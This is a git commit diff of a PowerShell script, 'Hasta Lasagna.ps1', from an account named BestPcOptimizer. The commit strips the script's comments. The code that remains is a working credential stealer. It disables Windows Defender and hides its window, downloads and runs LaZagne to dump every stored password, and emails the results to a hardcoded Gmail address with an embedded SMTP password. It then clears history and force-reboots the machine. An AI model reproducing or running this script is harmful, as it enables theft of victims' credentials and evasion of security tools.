c05a23123764adbead53473a9a15c0b6606e5d66
BestPcOptimizer <73123829+BestPcOptimizer@users.noreply.github.com>
2022-11-26 22:04:18 -0700

    Update Hasta Lasagna.ps1

--- Hasta Lasagna.ps1
+++ Hasta Lasagna.ps1
@@ -77,39 +77,39 @@ public static extern bool SetForegroundWindow(IntPtr hWnd);
 
 Set-Alias -Name 'Set-WindowStyle' -Value 'Set-WindowState'
 
-# Disable real time protection
+# 
 Set-MpPreference -DisableRealtimeMonitoring $true
-# Minimize window 
+# 
 Get-Process -ID $PID | Set-WindowState -State HIDE
-# Create a tmp directory in the Downloads folder
+# 
 $dir = "C:\Users\$env:UserName\Downloads\tmp"
 New-Item -ItemType Directory -Path $dir
-# Add an exception to Windows Defender for the tmp directory
+# 
 Add-MpPreference -ExclusionPath $dir
-#Hide the directory
+
 $hide = Get-Item $dir -Force
 $hide.attributes='Hidden'
-# Download the executable
+# 
 Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe" -OutFile "$dir\lazagne.exe"
-# Execute the executable and save output to a file
+#
 & "$dir\lazagne.exe" all > "$dir\output.txt"
 
-# Exfiltrate the file
+# 
 #POST REQUEST
 #Invoke-WebRequest -Uri "http://IP:PORT0" -Method POST -Body Get-Content "$dir\output.txt"
 
-#Mail Exfiltration
-$smtp = "smtp-mail.outlook.com" # Put SMTP SERVER HERE, TESTED WITH GOOGLES
-$From = "iamaalt922@gmail.com" # Put the SENDER HERE
-$To = "iamaalt921@gmail.com" # Put the RECEIVER HERE
-$smtp = "smtp-mail.outlook.com" # PUT YOUR SMTP SERVER HERE (TESTED WITH GOOGLE)
-$Subject = "Ducky Rapport"
-$Body = "Hi, here is the Rapport"
+#
+$smtp = "smtp-mail.outlook.com" # e
+$From = "iamaalt922@gmail.com" # e
+$To = "iamaalt921@gmail.com" # Pe
+$smtp = "smtp-mail.outlook.com" # e
+$Subject = "et"
+$Body = "e"
 
-# The password is an app-specific password if you have 2-factor-auth enabled
+# 
 $Password = "yeet1321" | ConvertTo-SecureString -AsPlainText -Force
 $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $From, $Password
-# The smtp server used to send the file
+# e
 Send-MailMessage -From $From -To $To -Subject $Subject -Body $Body -Attachments "$dir\output.txt" -SmtpServer $smtp -port 587 -UseSsl -Credential $Credential
 
 # Clean up
@@ -117,8 +117,8 @@ Remove-Item -Path $dir -Recurse -Force
 Set-MpPreference -DisableRealtimeMonitoring $false
 Remove-MpPreference -ExclusionPath $dir
 
-# Remove the script from the system
+# 
 Clear-History
 
-# Reboot the system
+
 Restart-Computer -Force
